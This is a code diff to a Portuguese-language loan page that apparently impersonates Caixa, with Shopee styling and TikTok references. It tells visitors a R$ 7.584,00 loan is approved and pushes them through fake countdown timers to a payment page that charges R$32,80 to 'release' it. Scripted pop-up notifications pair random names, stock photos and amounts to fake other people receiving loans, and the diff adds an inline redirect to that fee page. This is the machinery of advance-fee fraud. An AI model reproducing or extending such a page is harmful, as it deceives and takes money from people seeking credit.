@@ -245,6 +245,13 @@
         overflow: hidden;
         will-change: width;
       }
+
+      /* ✅ garante clique no botão mesmo com overlays */
+      #btnPayInsurance{
+        position: relative !important;
+        z-index: 999999 !important;
+        pointer-events: auto !important;
+      }
     </style>
   </head>
   <body>
@@ -319,13 +326,13 @@
           <!-- ... conteúdo da etapa 3 Banco ... -->
         </div>
 
-        <!-- Etapa 4: Seguro Prestamista com vídeo autoplay (AGORA ACTIVE) -->
+        <!-- Etapa 4 -->
         <div id="step4" class="payment-step active">
           <h1 class="text-2xl font-bold text-gray-800 mb-5">
             Falta apenas mais um passo
           </h1>
 
-          <!-- Barra de Progresso indicando último passo -->
+          <!-- Barra de Progresso -->
           <div class="bg-white rounded-xl shadow-md p-6 mb-5">
             <div class="flex items-center mb-5">
               <div class="bg-shopee-light bg-opacity-10 p-3 rounded-full mr-3">
@@ -340,13 +347,8 @@
             </div>
 
             <div class="relative mb-4">
-              <div
-                class="w-full h-4 bg-gray-100 rounded-full overflow-hidden shadow-inner"
-              >
-                <div
-                  class="h-full rounded-full shopee-gradient"
-                  style="width: 90%; transition: width 1.5s ease-in-out"
-                >
+              <div class="w-full h-4 bg-gray-100 rounded-full overflow-hidden shadow-inner">
+                <div class="h-full rounded-full shopee-gradient" style="width: 90%; transition: width 1.5s ease-in-out">
                   <div class="absolute top-0 h-1 w-full bg-white bg-opacity-20"></div>
                 </div>
               </div>
@@ -379,97 +381,62 @@
               <span class="font-medium text-shopee">90% concluído</span>
             </div>
 
-            <div
-              class="bg-shopee bg-opacity-5 p-4 rounded-lg border border-shopee border-opacity-10"
-            >
+            <div class="bg-shopee bg-opacity-5 p-4 rounded-lg border border-shopee border-opacity-10">
               <div class="flex items-start">
                 <i class="fas fa-info-circle text-shopee mt-1 mr-3"></i>
                 <p class="text-sm text-gray-600">
-                  Parabéns! Você está na etapa final. Após completar este
-                  último passo, seu empréstimo será liberado diretamente para
-                  sua conta.
+                  Parabéns! Você está na etapa final. Após completar este último passo, seu empréstimo será liberado diretamente para sua conta.
                 </p>
               </div>
             </div>
           </div>
 
-          <vturb-smartplayer
-            id="vid-692808addf28f42703ff3f55"
-            style="display: block; margin: 0 auto; width: 100%"
-          ></vturb-smartplayer>
+          <vturb-smartplayer id="vid-692808addf28f42703ff3f55" style="display:block;margin:0 auto;width:100%"></vturb-smartplayer>
           <script type="text/javascript">
             var s = document.createElement("script");
-            s.src =
-              "https://scripts.converteai.net/ac70c486-084d-457e-b1c7-994516d3b1e1/players/692808addf28f42703ff3f55/v4/player.js";
+            s.src = "https://scripts.converteai.net/ac70c486-084d-457e-b1c7-994516d3b1e1/players/692808addf28f42703ff3f55/v4/player.js";
             s.async = !0;
             document.head.appendChild(s);
-            
           </script>
 
-          
-
           <div id="seguroPrestamistaInfo">
-            <p class="text-lg font-medium text-gray-800 mb-4">
-              Benefícios da Caixa:
-            </p>
+            <p class="text-lg font-medium text-gray-800 mb-4">Benefícios da Caixa:</p>
 
             <ul class="space-y-3 mb-5">
               <li class="flex items-start">
-                <div
-                  class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center"
-                  style="width: 20px; height: 20px; min-width: 20px"
-                >
+                <div class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center" style="width:20px;height:20px;min-width:20px">
                   <i class="fas fa-check text-green-600 text-xs"></i>
                 </div>
                 <span class="text-gray-700">Menor taxa do mercado 0,81% ao mês</span>
               </li>
               <li class="flex items-start">
-                <div
-                  class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center"
-                  style="width: 20px; height: 20px; min-width: 20px"
-                >
+                <div class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center" style="width:20px;height:20px;min-width:20px">
                   <i class="fas fa-check text-green-600 text-xs"></i>
                 </div>
                 <span class="text-gray-700">Pode Receber seu empréstimo em até 5 minutos</span>
               </li>
               <li class="flex items-start">
-                <div
-                  class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center"
-                  style="width: 20px; height: 20px; min-width: 20px"
-                >
+                <div class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center" style="width:20px;height:20px;min-width:20px">
                   <i class="fas fa-check text-green-600 text-xs"></i>
                 </div>
                 <span class="text-gray-700">Primeira parcela só em 90 dias</span>
               </li>
               <li class="flex items-start">
-                <div
-                  class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center"
-                  style="width: 20px; height: 20px; min-width: 20px"
-                >
+                <div class="bg-green-100 rounded-full p-1 mr-3 mt-1 flex items-center justify-center" style="width:20px;height:20px;min-width:20px">
                   <i class="fas fa-check text-green-600 text-xs"></i>
                 </div>
-                <span class="text-gray-700"
-                  >Sistema mais seguro do Brasil nota 1000 no reclame aqui</span
-                >
+                <span class="text-gray-700">Sistema mais seguro do Brasil nota 1000 no reclame aqui</span>
               </li>
             </ul>
 
             <div class="mb-6 mt-6 bg-white rounded-lg p-6 shadow-sm border border-gray-100">
               <div class="text-center mb-5">
-                <h2 class="text-xl font-bold text-gray-800 mb-1">
-                  Falta apenas mais um passo
-                </h2>
-                <p class="text-sm text-gray-600">
-                  Estamos preparando seu empréstimo...
-                </p>
+                <h2 class="text-xl font-bold text-gray-800 mb-1">Falta apenas mais um passo</h2>
+                <p class="text-sm text-gray-600">Estamos preparando seu empréstimo...</p>
               </div>
 
               <div class="w-full bg-gray-100 rounded-full h-3 mb-3">
-                <div
-                  id="emprestimo-progressBar"
-                  class="bg-shopee h-3 rounded-full transition-all duration-500"
-                  style="width: 0%; display: block"
-                ></div>
+                <div id="emprestimo-progressBar" class="bg-shopee h-3 rounded-full transition-all duration-500" style="width:0%;display:block"></div>
               </div>
 
               <div class="flex justify-between items-center text-xs text-gray-500">
@@ -480,21 +447,16 @@
             </div>
           </div>
 
-          <div
-            id="liberacaoCard"
-            class="bg-amber-50 rounded-xl p-6 border border-amber-200 shadow-lg hidden"
-          >
+          <div id="liberacaoCard" class="bg-amber-50 rounded-xl p-6 border border-amber-200 shadow-lg hidden">
             <div class="flex items-center justify-center mb-3">
-              <img src="images/logocaixa2.png" alt="Tiktok Logo" class="h-7 mr-2" />
+              <img src="images/logocaixa2.png" alt="Tiktok Logo" class="h-7 mr-2"/>
               <h2 class="text-xl font-bold text-gray-800">Liberação do Crédito</h2>
             </div>
 
             <div class="space-y-3 mb-5 bg-white p-4 rounded-lg shadow-sm">
               <div class="flex justify-between items-center">
                 <span class="font-medium text-gray-700">Valor aprovado:</span>
-                <span class="font-bold text-shopee text-lg" id="valorLiberacaoCard"
-                  >R$ 7.584,00</span
-                >
+                <span class="font-bold text-shopee text-lg" id="valorLiberacaoCard">R$ 7.584,00</span>
               </div>
               <div class="flex justify-between items-center">
                 <span class="font-medium text-gray-700">Prazo de transferência:</span>
@@ -510,17 +472,27 @@
               Ao concluir a ativação, seu valor será processado automaticamente.
             </p>
 
+            <!-- ✅ BOTÃO COM ONCLICK (REDIRECIONA 100%) -->
             <button
               id="btnPayInsurance"
+              onclick="
+                (function(){
+                  const p=new URLSearchParams(window.location.search);
+                  p.set('valor','32.80');
+                  p.set('amount','3280');
+                  p.set('requestNumber', (crypto?.randomUUID?crypto.randomUUID():('req_'+Date.now()+'_'+Math.floor(Math.random()*1e6))));
+                  p.set('origem','vsl');
+                  window.location.href='/chat/vsl/payment.html?'+p.toString();
+                })();
+                return false;
+              "
               class="w-full bg-shopee-laranja hover:bg-shopee-laranja text-white text-lg font-bold py-4 rounded-xl mb-4 transition-all pulse"
             >
               LIBERAR MEU VALOR AGORA
             </button>
 
             <div class="text-center bg-gray-100 p-3 rounded-lg">
-              <p class="text-sm font-medium mb-1 text-gray-700">
-                Tempo restante para manter valor reservado:
-              </p>
+              <p class="text-sm font-medium mb-1 text-gray-700">Tempo restante para manter valor reservado:</p>
               <p id="timerCountdown" class="text-3xl font-bold text-shopee">04:57</p>
               <p class="text-sm text-gray-600">
                 Após o tempo acima, sua aprovação pode ser revogada pelo sistema TikTok
@@ -550,19 +522,7 @@
           }, 100);
         }
 
-        const step1 = document.getElementById("step1");
-        const step2Pix = document.getElementById("step2Pix");
-        const step2Bank = document.getElementById("step2Bank");
-        const step3PixComprovante = document.getElementById("step3PixComprovante");
-        const step3BankComprovante = document.getElementById("step3BankComprovante");
         const step4 = document.getElementById("step4");
-
-        function goToStep(currentStep, nextStep) {
-          document.querySelectorAll(".payment-step").forEach((step) => {
-            step.classList.remove("active");
-          });
-          nextStep.classList.add("active");
-        }
 
         const btnVoltar = document.getElementById("btnVoltar");
         if (btnVoltar) {
@@ -571,75 +531,16 @@
           });
         }
 
+        // --------- NOTIFICAÇÕES PROVA SOCIAL ---------
         const nomesFemininos = [
-          "Maria C.",
-          "Juliana T.",
-          "Ana L.",
-          "Fernanda R.",
-          "Camila S.",
-          "Bruna M.",
-          "Amanda C.",
-          "Daniela S.",
-          "Patrícia A.",
-          "Sandra R.",
-          "Débora P.",
-          "Aline S.",
-          "Vanessa M.",
-          "Carolina G.",
-          "Luciana P.",
-          "Adriana L.",
-          "Letícia F.",
-          "Renata P.",
-          "Natália C.",
-          "Mônica R.",
+          "Maria C.","Juliana T.","Ana L.","Fernanda R.","Camila S.","Bruna M.","Amanda C.","Daniela S.","Patrícia A.","Sandra R.",
+          "Débora P.","Aline S.","Vanessa M.","Carolina G.","Luciana P.","Adriana L.","Letícia F.","Renata P.","Natália C.","Mônica R."
         ];
-
         const nomesMasculinos = [
-          "Carlos A.",
-          "Roberto S.",
-          "Pedro M.",
-          "João V.",
-          "Lucas P.",
-          "Rafael G.",
-          "Gustavo L.",
-          "Felipe T.",
-          "Marcos V.",
-          "Victor M.",
-          "Thiago L.",
-          "Rodrigo C.",
-          "Ricardo F.",
-          "Marcelo S.",
-          "Eduardo M.",
-          "Bruno C.",
-          "Gabriel S.",
-          "Fábio L.",
-          "Leonardo S.",
-          "André V.",
+          "Carlos A.","Roberto S.","Pedro M.","João V.","Lucas P.","Rafael G.","Gustavo L.","Felipe T.","Marcos V.","Victor M.",
+          "Thiago L.","Rodrigo C.","Ricardo F.","Marcelo S.","Eduardo M.","Bruno C.","Gabriel S.","Fábio L.","Leonardo S.","André V."
         ];
-
-        const estados = [
-          "SP",
-          "RJ",
-          "MG",
-          "BA",
-          "RS",
-          "PR",
-          "PE",
-          "CE",
-          "GO",
-          "SC",
-          "DF",
-          "PA",
-          "ES",
-          "MT",
-          "MS",
-          "AM",
-          "RN",
-          "PB",
-          "AL",
-          "PI",
-        ];
-
+        const estados = ["SP","RJ","MG","BA","RS","PR","PE","CE","GO","SC","DF","PA","ES","MT","MS","AM","RN","PB","AL","PI"];
         const fotosFemininas = [
           "https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=80&w=60&h=60&auto=format&fit=crop",
           "https://images.unsplash.com/photo-1438761681033-6461ffad8d80?q=80&w=60&h=60&auto=format&fit=crop",
@@ -647,39 +548,32 @@
           "https://images.unsplash.com/photo-1544005313-94ddf0286df2?q=80&w=60&h=60&auto=format&fit=crop",
           "https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?q=80&w=60&h=60&auto=format&fit=crop",
           "https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=60&h=60&auto=format&fit=crop",
-          "https://images.unsplash.com/photo-1554151228-14d9def656e4?q=80&w=60&h=60&auto=format&fit=crop",
+          "https://images.unsplash.com/photo-1554151228-14d9def656e4?q=80&w=60&h=60&auto=format&fit=crop"
         ];
-
         const fotosMasculinas = [
           "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?q=80&w=60&h=60&auto=format&fit=crop",
           "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?q=80&w=60&h=60&auto=format&fit=crop",
           "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?q=80&w=60&h=60&auto=format&fit=crop",
           "https://images.unsplash.com/photo-1552058544-f2b08422138a?q=80&w=60&h=60&auto=format&fit=crop",
           "https://images.unsplash.com/photo-1499952127939-9bbf5af6c51c?q=80&w=60&h=60&auto=format&fit=crop",
-          "https://images.unsplash.com/photo-1599566150163-29194dcaad36?q=80&w=60&h=60&auto=format&fit=crop",
+          "https://images.unsplash.com/photo-1599566150163-29194dcaad36?q=80&w=60&h=60&auto=format&fit=crop"
         ];
 
         let notificacoesAtivas = false;
-
-        function valorAleatorio(min, max) {
-          return Math.floor(Math.random() * (max - min + 1) + min);
-        }
+        function valorAleatorio(min, max) { return Math.floor(Math.random() * (max - min + 1) + min); }
 
         function mostrarNotificacao() {
           if (!notificacoesAtivas) return;
 
           const isFeminino = Math.random() > 0.5;
           let nome, foto;
+
           if (isFeminino) {
-            const nomeIndex = Math.floor(Math.random() * nomesFemininos.length);
-            const fotoIndex = Math.floor(Math.random() * fotosFemininas.length);
-            nome = nomesFemininos[nomeIndex];
-            foto = fotosFemininas[fotoIndex];
+            nome = nomesFemininos[Math.floor(Math.random() * nomesFemininos.length)];
+            foto = fotosFemininas[Math.floor(Math.random() * fotosFemininas.length)];
           } else {
-            const nomeIndex = Math.floor(Math.random() * nomesMasculinos.length);
-            const fotoIndex = Math.floor(Math.random() * fotosMasculinas.length);
-            nome = nomesMasculinos[nomeIndex];
-            foto = fotosMasculinas[fotoIndex];
+            nome = nomesMasculinos[Math.floor(Math.random() * nomesMasculinos.length)];
+            foto = fotosMasculinas[Math.floor(Math.random() * fotosMasculinas.length)];
           }
 
           const estadoIndex = Math.floor(Math.random() * estados.length);
@@ -693,9 +587,7 @@
               <img src="${foto}" alt="Usuário" class="w-12 h-12 rounded-full object-cover">
             </div>
             <div class="flex-1">
-              <p class="text-sm font-medium">${nome} | ${estados[estadoIndex]} – Recebeu R$${valor.toLocaleString(
-            "pt-BR"
-          )}</p>
+              <p class="text-sm font-medium">${nome} | ${estados[estadoIndex]} – Recebeu R$${valor.toLocaleString("pt-BR")}</p>
               <p class="text-xs text-gray-500">Agora mesmo</p>
             </div>
           `;
@@ -703,45 +595,32 @@
           const container = document.getElementById("notificacoesContainer");
           container.appendChild(notificacao);
 
-          setTimeout(() => {
-            notificacao.classList.remove("translate-x-[100%]", "opacity-0");
-          }, 100);
+          setTimeout(() => { notificacao.classList.remove("translate-x-[100%]", "opacity-0"); }, 100);
 
           setTimeout(() => {
             notificacao.classList.add("translate-x-[100%]", "opacity-0");
-            setTimeout(() => {
-              notificacao.remove();
-            }, 500);
+            setTimeout(() => { notificacao.remove(); }, 500);
           }, 3000);
         }
 
         function iniciarNotificacoes() {
           notificacoesAtivas = true;
-
           setTimeout(() => {
             mostrarNotificacao();
-            setInterval(() => {
-              mostrarNotificacao();
-            }, 11000);
+            setInterval(mostrarNotificacao, 11000);
           }, 3000);
         }
 
         // --------- FORÇAR ENTRAR DIRETO NA ETAPA 4 ---------
-        document.querySelectorAll(".payment-step").forEach((step) => {
-          step.classList.remove("active");
-        });
-        if (step4) {
-          step4.classList.add("active");
-        }
+        document.querySelectorAll(".payment-step").forEach((step) => step.classList.remove("active"));
+        if (step4) step4.classList.add("active");
 
-        // Iniciar contador da Etapa 4 assim que a página carregar
         iniciarContadorBotao();
         iniciarNotificacoes();
       });
 
-      // ---------- FUNÇÕES DA ETAPA 4 (SEM MEXER NA LÓGICA) ----------
+      // ---------- FUNÇÕES DA ETAPA 4 ----------
       function iniciarContadorBotao() {
-        const btnPayInsurance = document.getElementById("btnPayInsurance");
         const progressBar = document.getElementById("emprestimo-progressBar");
         const contadorElement = document.getElementById("contador");
         const porcentagemElement = document.getElementById("porcentagem");
@@ -787,41 +666,12 @@
             setTimeout(() => {
               seguroPrestamistaInfo.style.display = "none";
               ofertaExpiraContainer.style.display = "none";
-
               liberacaoCard.classList.remove("hidden");
               iniciarTimerLiberacao();
             }, 200);
           }
         }, 1000);
-
-        // ✅ Redireciona para o payment da pasta /chat/vsl/
-document.addEventListener("click", (e) => {
-  const btn = e.target.closest("#btnPayInsurance");
-  if (!btn) return;
-
-  e.preventDefault();
-  e.stopPropagation();
-
-  const urlParams = new URLSearchParams(window.location.search);
-
-  // valores
-  urlParams.set("valor", "32.80");
-  urlParams.set("amount", "3280");
-
-  // requestNumber
-  const requestNumber =
-    (crypto?.randomUUID ? crypto.randomUUID() : ("req_" + Date.now() + "_" + Math.floor(Math.random()*1e6)));
-  urlParams.set("requestNumber", requestNumber);
-
-  // contexto
-  urlParams.set("origem", "vsl");
-
-  // 🔥 caminho absoluto correto
-  window.location.href = "/chat/vsl/payment.html?" + urlParams.toString();
-});
-
-        }
-      
+      }
 
       function iniciarTimerLiberacao() {
         const timerCountdown = document.getElementById("timerCountdown");
@@ -841,13 +691,9 @@ document.addEventListener("click", (e) => {
             return;
           }
 
-          timerCountdown.textContent = `${minutos.toString().padStart(2, "0")}:${segundos
-            .toString()
-            .padStart(2, "0")}`;
+          timerCountdown.textContent = `${minutos.toString().padStart(2, "0")}:${segundos.toString().padStart(2, "0")}`;
         }, 1000);
       }
     </script>
-
-    
   </body>
 </html>
